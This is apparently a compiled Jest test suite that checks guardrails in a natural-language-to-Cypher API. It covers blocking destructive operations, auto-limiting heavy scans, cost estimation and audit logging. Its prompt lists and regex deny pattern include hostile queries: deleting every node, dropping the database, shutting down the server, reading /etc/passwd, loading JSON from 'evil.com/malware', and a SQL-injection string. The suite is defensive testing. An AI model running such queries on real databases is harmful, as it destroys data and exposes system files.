"use strict";
/**
 * NL→Cypher Guardrails Test Suite
 * Validates dangerous operation blocking and safety mechanisms
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const supertest_1 = __importDefault(require("supertest"));
const app_js_1 = require("../src/app.js");
const globals_1 = require("@jest/globals");
(0, globals_1.describe)('NL→Cypher Guardrails', () => {
    const dangerousPrompts = [
        'drop all nodes',
        'delete every relationship',
        'match (n) detach delete n',
        'create index on :*(*);',
        'drop database neo4j',
        'call dbms.shutdown()',
        'load csv from "file:///etc/passwd"',
        'call apoc.load.json("http://evil.com/malware")',
        'merge (n) on create set n = {}',
        'create constraint on (n) assert n.id is unique',
        'drop constraint unique_id',
    ];
    const heavyScanPrompts = [
        'show me all transactions last year',
        'find all people connected to anyone',
        'match all relationships and return everything',
        'show me the entire graph',
        'find every possible path between any nodes',
    ];
    (0, globals_1.describe)('Dangerous Operation Blocking', () => {
        globals_1.test.each(dangerousPrompts)('should block: %s', async (prompt) => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt,
                options: { safeMode: true, autoLimit: 100 },
            })
                .expect(400);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: false,
                blocked: true,
                reason: globals_1.expect.stringMatching(/dangerous|destructive|not allowed|security/i),
                blockedOperation: globals_1.expect.any(String),
            });
            // Ensure no actual Cypher was generated
            (0, globals_1.expect)(response.body.cypher).toBeUndefined();
        });
    });
    (0, globals_1.describe)('Auto-Limiting Heavy Scans', () => {
        globals_1.test.each(heavyScanPrompts)('should auto-limit: %s', async (prompt) => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt,
                options: { safeMode: true, autoLimit: 100 },
            })
                .expect(200);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: true,
                cypher: globals_1.expect.stringMatching(/LIMIT 100\b/i),
                enforcedLimit: true,
                limitReason: globals_1.expect.stringMatching(/heavy scan|performance|safety/i),
            });
        });
    });
    (0, globals_1.describe)('Safe Operations', () => {
        const safePrompts = [
            'find person named John Smith',
            'show transactions for account 12345 in the last week',
            'match (p:Person)-[:WORKS_FOR]->(c:Company) return p.name, c.name limit 10',
            'find the shortest path between person A and person B',
        ];
        globals_1.test.each(safePrompts)('should allow: %s', async (prompt) => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt,
                options: { safeMode: true, autoLimit: 100 },
            })
                .expect(200);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: true,
                blocked: false,
                cypher: globals_1.expect.any(String),
            });
            // Verify generated Cypher doesn't contain dangerous keywords
            const cypher = response.body.cypher.toLowerCase();
            (0, globals_1.expect)(cypher).not.toMatch(/\b(drop|delete|create\s+index|create\s+constraint|merge\s+.*on\s+create|call\s+dbms|call\s+apoc\.load|load\s+csv)\b/);
        });
    });
    (0, globals_1.describe)('Cost Estimation Integration', () => {
        (0, globals_1.test)('should provide cost estimates for complex queries', async () => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: 'find all people connected within 3 degrees of John Smith',
                options: {
                    safeMode: true,
                    autoLimit: 100,
                    includeCostEstimate: true,
                },
            })
                .expect(200);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: true,
                cypher: globals_1.expect.any(String),
                costEstimate: {
                    estimatedRows: globals_1.expect.any(Number),
                    estimatedTimeMs: globals_1.expect.any(Number),
                    estimatedCostUSD: globals_1.expect.any(Number),
                    complexity: globals_1.expect.stringMatching(/low|medium|high|very_high/i),
                },
            });
        });
        (0, globals_1.test)('should warn about budget limits', async () => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: 'analyze all transaction patterns across the entire graph for the past 5 years',
                options: {
                    safeMode: true,
                    autoLimit: 100,
                    includeCostEstimate: true,
                    budgetCents: 1000, // $10 limit
                },
            })
                .expect(200);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: true,
                costEstimate: {
                    estimatedCostUSD: globals_1.expect.any(Number),
                    budgetWarning: true,
                    budgetSuggestion: globals_1.expect.stringMatching(/consider|reduce|optimize|limit/i),
                },
            });
        });
    });
    (0, globals_1.describe)('Error Handling', () => {
        (0, globals_1.test)('should handle malformed prompts gracefully', async () => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: ';;;DROP TABLE users;--',
                options: { safeMode: true },
            })
                .expect(400);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: false,
                error: globals_1.expect.stringMatching(/invalid|malformed|unsafe/i),
            });
        });
        (0, globals_1.test)('should handle empty prompts', async () => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: '',
                options: { safeMode: true },
            })
                .expect(400);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: false,
                error: globals_1.expect.stringMatching(/empty|required|missing/i),
            });
        });
        (0, globals_1.test)('should validate options', async () => {
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: 'find person John Smith',
                options: {
                    autoLimit: -1, // Invalid limit
                },
            })
                .expect(400);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: false,
                error: globals_1.expect.stringMatching(/invalid.*limit|limit.*positive/i),
            });
        });
    });
    (0, globals_1.describe)('Audit Logging', () => {
        (0, globals_1.test)('should log blocked operations', async () => {
            const consoleSpy = globals_1.jest.spyOn(console, 'warn').mockImplementation();
            await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: 'drop all nodes',
                options: { safeMode: true },
            })
                .expect(400);
            (0, globals_1.expect)(consoleSpy).toHaveBeenCalledWith(globals_1.expect.stringContaining('NL2CYPHER_BLOCKED'), globals_1.expect.objectContaining({
                prompt: 'drop all nodes',
                reason: globals_1.expect.any(String),
                timestamp: globals_1.expect.any(String),
            }));
            consoleSpy.mockRestore();
        });
        (0, globals_1.test)('should log cost threshold breaches', async () => {
            const consoleSpy = globals_1.jest.spyOn(console, 'info').mockImplementation();
            await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: 'find all people connected within 5 degrees',
                options: {
                    safeMode: true,
                    includeCostEstimate: true,
                    budgetCents: 100, // Very low budget
                },
            })
                .expect(200);
            (0, globals_1.expect)(consoleSpy).toHaveBeenCalledWith(globals_1.expect.stringContaining('NL2CYPHER_BUDGET_WARNING'), globals_1.expect.objectContaining({
                estimatedCost: globals_1.expect.any(Number),
                budgetLimit: 100,
            }));
            consoleSpy.mockRestore();
        });
    });
    (0, globals_1.describe)('Performance & Timeout', () => {
        (0, globals_1.test)('should timeout for extremely long processing', async () => {
            // This test simulates a complex prompt that takes too long to process
            const complexPrompt = 'analyze the complete social network structure with all possible relationship types and temporal patterns across all entities and their multi-degree connections with sentiment analysis and predictive modeling for future relationship formation probabilities';
            const response = await (0, supertest_1.default)(app_js_1.app)
                .post('/api/nl2cypher/translate')
                .send({
                prompt: complexPrompt,
                options: {
                    safeMode: true,
                    timeoutMs: 100, // Very short timeout for testing
                },
            })
                .expect(408);
            (0, globals_1.expect)(response.body).toMatchObject({
                success: false,
                error: globals_1.expect.stringMatching(/timeout|too long/i),
            });
        }, 10000); // Allow 10s for test timeout
    });
});
